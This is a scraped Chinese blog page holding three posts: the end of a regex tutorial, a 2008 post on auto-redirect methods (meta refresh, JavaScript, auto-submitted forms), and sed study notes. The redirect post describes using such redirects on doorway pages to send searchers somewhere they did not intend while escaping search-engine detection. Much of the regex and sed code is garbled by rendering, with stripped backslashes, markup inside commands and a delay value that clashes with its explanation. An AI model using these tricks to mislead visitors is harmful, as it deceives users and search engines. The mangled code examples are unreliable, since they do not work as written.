<p>满足第一个需求的正则表达式为&lt;<bw{6}b>&gt;。满足第二个需求的正则表达式为&lt;<bw*catw*b>&gt;。</bw*catw*b></bw{6}b></p>
<p>把两者结合起来，我们可以得到如下的正则表达式：</p>
<pre><code>&lt;&lt;(?=bw{6}b)bw*catw*b&gt;&gt;
</code></pre><p>具体的匹配过程留给读者。但是要注意的一点是，向前查看是不消耗字符的，因此当判断单词满足具有6个字符的条件后，引擎会从开始判断前的位置继续对后面的正则表达式进行匹配。</p>
<p>最后作些优化，可以得到下面的正则表达式：</p>
<p>&lt;<b(?=w{6}b)w{0,3}catw*>&gt;</b(?=w{6}b)w{0,3}catw*></p>
<p>15.  正则表达式中的条件测试</p>
<p>条件测试的语法为&lt;&lt;(?ifthen|else)&gt;&gt;。“if”部分可以是向前向后查看表达式。如果用向前查看，则语法变为：&lt;&lt;(?(?=regex)then|else)&gt;&gt;，其中else部分是可选的。</p>
<p>如果if部分为true，则正则引擎会试图匹配then部分，否则引擎会试图匹配else部分。</p>
<p>需要记住的是，向前先后查看并不实际消耗任何字符，因此后面的then与else部分的匹配时从if测试前的部分开始进行尝试。</p>
<p>16.  为正则表达式添加注释</p>
<p>在正则表达式中添加注释的语法是：&lt;&lt;(?#comment)&gt;&gt;</p>
<p>例：为用于匹配有效日期的正则表达式添加注释：</p>
<p> (?#year)(19|20)dd<a href="?#month">- /.</a>(0[1-9]|1[012])<a href="?#day">- /.</a>(0[1-9]|[12][0-9]|3[01])`</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/22/“自动转向”技术/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/22/“自动转向”技术/" itemprop="url">
                  “自动转向”技术
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-22T10:30:35+08:00">
                2008-03-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Other/" itemprop="url" rel="index">
                    <span itemprop="name">Other</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>自动转向(Auto-Redirecting)，也叫自动重定向。自动跳转，指当访问用户登陆到某网站时，自动将用户转向其它网页地址的一种技术。转向的网页地址可以是网站内的其它网页，也可以是其它网站。通常情况下，浏览器会收到一个网页，该页面含有自动加载一其它网页的代码。该页面有可能在服务器端被转换，这样的话，浏览器只收到一个页面，而自动转向往往意味着浏览器收到的页面具有自动将访问用户送至其它页面的功能。</p>
<p>　　对自动转向技术(Auto-Redirecting)的合理应用包括：将用户转向到指定浏览器的网页版本；当网站的域名变更或删除后将人们转向到新域名下，等等。但现在这种技术却往往被搜索引擎优化人士用来作为提高网站的搜索引擎排名的一种手段。例如，先专门针对搜索引擎做一个高度优化的网页，也就是我们通常所说的“桥页”，然后把这个网页提交给搜索引擎来获得好的排名。但是，当搜索用户通过搜索引擎的搜索结果列表点击该网页列表进入后，将被自动转向到一个用户本来无意去访问的网站地址。搜索引擎常常认为自动转向的网页是对读者的误导，所以它会对这种网页或网站施以惩戒，不过对一些自动转向方法它目前还无法自动检测出来。</p>
<p>　　Meta Refresh Tag自动转向法</p>
<p>　　由于搜索引擎能够读取HTML，而Meta tags也是HTML，所以对于这种自动转向法，搜索引擎能够自动检测出来。因而无论网站的转向出于什么目的，都很容易被搜索引擎视做对读者的误导而受到惩罚。不过，如果跳转延迟时间设置合适，搜索引擎就不会视之为作弊。</p>
<p>　　页面定时刷新元标识(Meta Refresh Tag)只能放在HTML代码的&lt; HEAD&gt;区里。如下所示：</p>
<p>　　<meta http-equiv="refresh" content="10; url=http://www.williamlong.info/"></p>
<p>　　其中的“10”是告诉浏览器在页面加载5秒钟后自动跳转到url这个页面。</p>
<p>　　这种方法常可以在论坛中见到。如果在论坛上发信息，先会看到一个确认页面，几秒后会自动重新跳转回当前的论坛页面中。</p>
<p>　　从搜索引擎优化的角度出发，一般不希望自动转向有延迟。不过，如果是用Meta Refresh标识进行转向，一定要注意把延迟时间设定成至少10秒以上。</p>
<p>　　“javascript”自动转向法</p>
<p>　　由于不能解析javascript，所以搜索引擎无法察觉(自动检测到)用javascript脚本进行的自动转向。javascript自动重定向脚本可以放在网页的任何位置上，如果要求立即跳转，则可以将其放入网页源码的<head>区内的最上面。用javascript实现跳转的范例如下：</head></p>
<p>　　<script language="javascript"><!--location.replace("pagename.html")//--></script></p>
<p>　　其中的“pagename.html”指特定的重定向目标地址，用相对/绝对URL地址均可。</p>
<p>　　用javascript实现自动重定向的好处在于：用户所访问的目标URL不会保留在用户浏览器的历史记录中，如果用户按返回按钮返回，则将回到跳转前的网页，而不是包含javascript自动重定向脚本的跳转页面，所以不会出现当用户点击返回按钮后返回至重定向页，然后该页自动跳转到用户本来想离开的那个页面的尴尬情形。</p>
<p>　　如果需要，可以把javascript自动重定向脚本存在一个外部文件中，并通过下面的命令行来加载，其中“filename.js”是该外部文件的路径和文件名：</p>
<p>　　<script language="javascript" src="filename.js"></script></p>
<p>　　注意：若需实现即刻转向，或不希望人们看到转向前的那个页面，一般常用javascript脚本实现。在这种情况下应将javascript脚本放入HTML源码的<head>区中。</head></p>
<p>　　表单(FORM)自动转向法</p>
<p>　　搜索引擎的“爬行”程序是不会填写表单的，所以它们也不会注意到提交表单，因而可以利用表单来实现自动转向(重定向)而不让搜索引擎察觉。</p>
<p>　　对于表单，人们往往很少意识到：表单的Action参数中包含的URL地址其实正是浏览器向服务器所请求的URL。浏览器将会通过向请求的URL地址增加一些格式为name=value的参数给予它以特殊的对待。在什么都没有的情况下，浏览器仍旧会为该URL安排请求至服务器。</p>
<p>　　用javascript脚本可让页面开始加载时即提交表单。下面是一个用javascript实现表单自动提交，以及提交表单的范例：</p>
<p>　　<script language="javascript"><!--document.myform.submit()//--></script></p>
<p>　　<form name="myform" action="pagename.html" method="get"></form></p>
<p>　　其中“myform”可以是任意名称，“pagename.html”用相对/绝对URL地址均可。</p>
<p>　　小结</p>
<p>　　如果访问用户最终看到的是他们想看到的，那么在搜索引擎优化中使用自动转向技术并没有什么不对，也并不是什么不道德的行为。但有些人往往会在利用“自动跳转”技术，利用“桥页”吸引访问者，然后把他们送到他们无意浏览的页面或网站，这种做法只会引起访问用户的反感，又怎么能够期望访问流量可以有效转化为最终客户呢?</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/21/《Unix_Shell_实例精解》学习笔记之sed篇/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/21/《Unix_Shell_实例精解》学习笔记之sed篇/" itemprop="url">
                  《Unix Shell 实例精解》学习笔记之sed篇
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-21T17:35:40+08:00">
                2008-03-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index">
                    <span itemprop="name">Linux</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>1．sed命令简介<br>sed是流线型、非交互式编辑器。它允许你执行与vi和ex编辑器里一样的编辑任务。Sed 程序不是与编辑器交互式工作的，而是让你在命令行里敲入编辑的命令，给文件命名，然后在屏幕上查看命令输出结果。<br>2．sed工作原理<br>sed编辑器按一次处理一行的方式来处理文件，并把输出送到屏幕上。<br>3．sed 可以用寻址的方式来决定想要编辑哪一行。<br>4．sed 命令和选项<br>命令 功能<br>a  在当前行上添加一个文本行或者多个文本行<br>c  用新闻本改变（取代）当前行里的文本<br>d  删除行<br>i  在当前行之前插入文本<br>h  把模式空间内容复制到一个固定缓存<br>H  把模式空间内容添加到一个固定缓存<br>g  得到固定缓存里所有的禀复制到模式缓存，重写其内容<br>G  得到固定缓存的内容并复制到模式缓存，添加到里面<br>I  列出不打印的字符<br>p  打印行<br>n  读下一输入行，并开始用下一个命令处理换行符，而不是用第一个命令<br>q  结束或退出sed<br>r  从一个文件读如行<br>!  把命令应用到除了选出的行以外的其他所有行<br>s  把一个字串替换成另一个<br>替换标志<br>g  在一行上进行全局替换<br>p  打印行<br>w  把行写到一个文件中<br>x  用模式空间的内容交换固定缓存的内容<br>y  把一个字符转换成另一个(不能和整则表达式元字符一起使用)<br>5．sed元字符<br>    基本上，grep和vi使用的元字符都可以用在sed中。下表列出了一些特别的sed元字符：<br>元字符 &amp;amp;<br>功能 保存搜索串以便可以记在替换串里<br>例子    s/love/<strong>&amp;amp;</strong>/<br>解释    &amp;amp;号代表搜索串。串love将被星号包围的自身所替代；即love变成<strong>love</strong><br>6． sed 的实例(使用datafile)<br>datafile内容如下：<br>northwest NW Charles Main      3.0 .98 3 34<br>western  WE Sharon Gray      5.3 .97 5 23<br>southwest SW Lewis Dalsass      2.7 .8 2 18<br>southern SO Suan Chin      5.1  .95 4 15<br>southeast SE      Patricia Hemenway    4.0  .7  4  17<br>eastern  EA  TB Savage       4.4  .84  5  20<br>northeast  NE  AM Main Jr.       5.1  .94  3  13<br>north   NO  Margot Weber       4.5  .89 5   9<br>central  CT  Ann Stephens         5.7  .94   5  13<br>1&gt; 打印：p命令<br>sed ‘/north/p’ datafile<br>默认输出所有行，找到north的行重复打印<br>sed –n ‘/north/p’ datafile<br>禁止默认输出，只打印找到north的行<br>2&gt; 删除：d命令<br>sed ‘3d’ datafile<br>删除第三行，其余行输出到屏幕<br>sed ‘3,$d’ datafile<br>从第3行到最后一行都删除，将剩余部分输出到屏幕<br>sed ‘/north/d’ datafile<br>将含有north的行删除，其余输出到屏幕<br>3&gt; 替换：s命令<br>sed ‘s/west/north/g’ datafile<br>解释：找到datafile中的所有west并替换成north，将替换后的内容输出到屏幕。<br>sed ‘s/[0-9][0-9]$/&amp;amp;.5/‘ datafile<br>解释：在替代串里的&amp;amp;字符代表在搜索串中真正找到的。每个以两个数字结尾的行都被它自己取代，且要在后面加上.5<br>sed -n ‘s/Hemenway/Jones/gp’ datafile<br>解释：所有的Hemenway所在的位置都用Jones来取代，而且只有改变的行被打印。-n与p命令选项相结合来禁止默认输出。g代表全局替换<br>sed -n ‘s/(Mar)got/1ianne/p’ datafile<br>解释：模式Mar被封装在括弧里且在一个专用寄存器里存为标记1。在替换串里它将被引用做1。然后用Marianne替代Margot。<br>sed ‘s#3#88#g’ datafile<br>解释：s命令后面的字符是搜索串和替换串之间的分界符。默认的分界符是一个正斜杠，但也可以改变（只有使用s命令时）。无论s命令后面跟什么字符，它都是新的串分界符。当搜索包含一个正斜杠的模式，如路径或生日时，这种技巧可能有用的 ^V^<br>4&gt; 被选中的行的范围：逗号<br>sed -n ‘/west/,/east/p’ datafile<br>解释：打印在west和east之间的模式范围内所有行。如果west出现在east之后，则打印从west到下一个east或者到文件末尾的行，无论哪种情况先出现都可以。<br>sed ‘/west/,/east/s/$/<strong>VACA</strong>/‘ datafile<br>解释：对于在模式west到east范围内的行，行末尾将用<strong>VACA</strong>来取代。<br>5&gt; 多次编辑 -e 选项<br>sed -e ‘1,3d’ -e ‘s/Hemenway/Jones/‘ datafile<br>-e选项允许多次编辑。不同的编辑顺序可能导致不同的结果。<br>例如，如果两个命令都执行了替换，第一次替换可能影响第二次替换。<br>6&gt; 从文件中读取：r命令<br>sed ‘/Suan/r newfile’ datafile<br>解释：r命令从newfile中读取内容，将内容输出到Suan的后面。如果datafile中Suan出现的次数不只一次，则分别放到Suan的后面。<br>7&gt; 写入文件：w命令<br>sed -n ‘/north/w newfile’ datafile<br>解释：w命令把指定的行写入到一个文件。本例中所有的包含north的行写入到newfile中。<br>等同于 sed -n ‘/north/p’ datafile &gt; newfile<br>8&gt; 添加：a命令<br>$ sed ‘/north/a</p>
<blockquote>
<p>—-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–’ datafile<br> northwest NW Charles Main      3.0 .98 3 34<br>  —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> western WE Sharon Gray      5.3 .97 5 23<br> southwest SW Lewis Dalsass      2.7 .8 2 18<br> southern SO Suan Chin      5.1  .95 4 15<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br> eastern  EA  TB Savage       4.4  .84  5  20<br> northeast  NE  AM Main Jr.       5.1  .94  3  13<br> —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> north   NO  Margot Weber       4.5  .89 5  9<br> —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> central  CT  Ann Stephens         5.7  .94   5  13<br>    解释：红颜色的内容是要输入的内容。a命令后面跟要添加的内容。奇怪的是a后面必须另起一行，在输入要添加的内容，否则会提示命令错乱，真是搞不懂。<br>9&gt; 插入：i命令<br>$ sed ‘/north/i<br>—-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–’ datafile<br>  —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> northwest NW Charles Main      3.0 .98 3 34<br>  —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> western WE Sharon Gray      5.3 .97 5 23<br> southwest SW Lewis Dalsass      2.7 .8 2 18<br> southern SO Suan Chin      5.1  .95 4 15<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br> eastern  EA  TB Savage       4.4  .84  5  20<br> —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> northeast  NE  AM Main Jr.       5.1  .94  3  13<br> —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> north   NO  Margot Weber       4.5  .89 5  9<br> central  CT  Ann Stephens         5.7  .94   5  13<br>10&gt;下一个：n命令<br>$ sed ‘/eastern/{n;s/AM/Archie/;}’ datafile<br>  northwest NW Charles Main      3.0 .98 3 34<br>  western WE Sharon Gray      5.3 .97 5 23<br>  southwest SW Lewis Dalsass      2.7 .8 2 18<br>  southern SO Suan Chin      5.1  .95 4 15<br>  southeast SE      Patricia Hemenway    4.0  .7  4  17<br>  eastern  EA  TB Savage       4.4  .84  5  20<br>  northeast  NE  AM Main Jr.       5.1  .94  3  13<br>  ……<br>解释：如果在某一行里模式eastern被匹配，n命令使sed区的下一行，用该行带换模式空间，用Archie替换AM，打印并继续。<br>11&gt;变换：y 命令<br>% sed ‘1,3y/abcdefghijklmnopqrst/ABCDEFGHIJKLMNOPQRST/‘ datafile<br>解释:将对应字母进行转换。<br>12&gt;退出：q命令<br>% sed ‘5q’ datafile<br>解释：在打印了5行之后，用q命令退出sed程序。<br>13&gt;保存和取得：h和G命令<br>$ sed -e ‘/southeast/h’ -e ‘$G’ datafile<br> northwest NW Charles Main      3.0 .98 3 34<br> western  WE Sharon Gray      5.3 .97 5 23<br> southwest SW Lewis Dalsass      2.7 .8 2 18<br> southern SO Suan Chin      5.1  .95 4 15<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br> eastern  EA  TB Savage       4.4  .84  5  20<br> northeast  NE  AM Main Jr.       5.1  .94  3  13<br> north   NO  Margot Weber       4.5  .89 5   9<br> central  CT  Ann Stephens         5.7  .94   5  13<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br>解释：当sed处理文件时，每行都存在模式空间(pattern space)的临时缓存中。除非行被禁止打印或删除,否则行将在处理完后被打印到屏幕，然后请模式空间并把下一输入行保存在那里等待处理。在这个例子中，在找到模式之后，把它放在模式空间里，而且h命令复制它并把它存到另一个叫做保存缓存(holding buffer)中。<br>第二个sed指令里，当读入最后一行($)时,G命令告诉sed从包存缓存中取得该行并放回模式空间缓存，添加到当前存在那里的行中。本例子就是最后一行。<br>$ sed -e ‘/WE/{h;d;}’ -e ‘/CT/G’ datafile<br> northwest NW Charles Main      3.0 .98 3 34<br> southwest SW Lewis Dalsass      2.7 .8 2 18<br> southern SO Suan Chin      5.1  .95 4 15<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br> eastern  EA  TB Savage       4.4  .84  5  20<br> northeast  NE  AM Main Jr.       5.1  .94  3  13<br> north   NO  Margot Weber       4.5  .89 5   9<br> central  CT  Ann Stephens         5.7  .94   5  13<br> western WE Sharon Gray      5.3 .97 5 23<br>解释：第一个命令h将找到了WE的行放到保存缓存中，然后删除该行；第二个命令/CT/G就是在找到了CT的行的后面加入保存缓存的内容。<br>14&gt;G和g的区别<br>    G命令在符合的条件行后面添加保存缓存中的内容；g命令用保存缓存中的内容覆盖符合条件的行。<br>15&gt;sed 命令的花括号{}的作用<br>   花括号{}中可以放入多个命令，每个命令后面要用分号;。<br>16&gt;保存和交换：h 和 x命令。<br>$ sed -e ‘/Patricia/h’ -e ‘/Margot/x’ datafile<br>northwest  NW  Charles Main   3.0  .98  3  34<br>western  WE  Sharon Gray   5.3  .97  5  23<br>southwest  SW  Lewis Dalsass  2.7  .8  2  18<br>southern  SO  Suan Chin          5.1  .95  4  15<br>southeast  SE  Patricia Hemenway  4.0  .7  4  17<br>eastern  EA  TB Savage          4.4  .84  5  20<br>northeast  NE  AM Main Jr.          5.1  .94  3  13<br>southeast  SE  Patricia Hemenway  4.0  .7  4  17<br>central  CT  Ann Stephens          5.7  .94  5  13<br>解释：x命令将找到的行用保存缓存中的内容替换。<br>7． 用sed来编写命令表<br>     sed 命令表(script)是文件里的一个sed命令列表。用-f选项来引用一个命令表文件。编辑sed命令表有特殊要求：命令末尾不能有任何为岁的空白符或者文本。如果命令不是自成一行，就必须用分号结束。在源代码chap4目录下有两个编辑好的命令表文件(sedding1和sedding2)可以参考。<br>   下面是使用sed命令表的例子。<br>$ sed -f sedding1 datafile</p>
<h2 id="EMPLOYEE-DATABASE"><a href="#EMPLOYEE-DATABASE" class="headerlink" title="  EMPLOYEE DATABASE"></a>  EMPLOYEE DATABASE</h2><p>  northwest NW Charles Main 3.0 .98 3 34<br>  western WE Sharon Gray 5.3 .97 5 23<br>  southwest SW Lewis Dalsass 2.7 .8 2 18<br> Lewis is the TOP Salesperson for April!!<br> Lewis is moving to the southern district next month.<br> CONGRATULATIONS!<br>  southern SO Suan Chin 5.1 .95 4 15<br>  southeast SE Patricia Hemenway 4.0 .7 4 17<br>  eastern EA TB Savage 4.4 .84 5 20<br>  northeast NE AM Main Jr. 5.1 .94 3 13</p>
<hr>
<pre><code>MARGOT HAS RETIRED
</code></pre><hr>
<p>8． Sed练习参考答案<br>    练习内容参考databook文件<br> 1〉 把Jon改成Jonathan<br>sed ‘s/Jon/Jonathan/‘ datebook<br>2〉 删除头3行<br>sed ‘1,3d’ datebook<br>3〉 打印5—10行<br>sed -n ‘5,10p’ datebook<br>4〉 删除包含Lane的行<br>sed ‘/Lane/d’ datebook<br>5〉 打印所有生日是在Noverber到December之间的行<br>sed -n ‘/:1[12]//p’ datebook<br>6〉 把三个星添加到以Fred开头的行尾<br>sed ‘/^Fred/s/$/<em>**/‘ datebook<br>7〉 用JOSE HAS RETIRED取代包含Jose的行<br>sed ‘s/^Jose[0-9]</em>[a-z]<em>[A-Z]</em> <em>.</em>$/JOSE HAS LEFT/‘ datebook<br>8〉 把Popeye的生日改成11/14/46<br>sed ‘/Popeye/s/:[0-9]<em>[0-9]</em>/[0-9]<em>[0-9]</em>/[0-9]<em>[0-9]</em>/:11/14/46/‘ datebook<br>9〉 删除所有空白行 sed ‘/^$/d’ datebook 10〉 写一个sed命令表，将:<br>a. 在第1行之前插入标题PERSONNEL FILE<br>b. 删除以500结尾的工资<br>c. 打印文件内容，把姓和名颠倒<br>d. 在文件末尾添加THE END<br>答案放在chap04/a10文件中，内容如下：</p>
<h1 id="My-first-sed-script-by-Wangzhh"><a href="#My-first-sed-script-by-Wangzhh" class="headerlink" title="My first sed script by Wangzhh."></a>My first sed script by Wangzhh.</h1><p>1i<br> PERSONNEL FILE<br>/500/d<br>s/([A-Z][a-z]<em>) ([A-Z][a-z]</em>):/2 1:/<br>$a<br> THE END</p>
</blockquote>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/16/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/27/">27</a><a class="extend next" rel="next" href="/page/18/"><i class="fa fa-angle-right"></i></a>
  </nav>


          
          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="九王爷" />
          <p class="site-author-name" itemprop="name">九王爷</p>
           
              <p class="site-description motion-element" itemprop="description">这里是外宅，备份用的</p>
          
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">269</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">19</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">41</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">九王爷</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    
    
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  





  



  
  

  

  

  

  


  

</body>
</html>
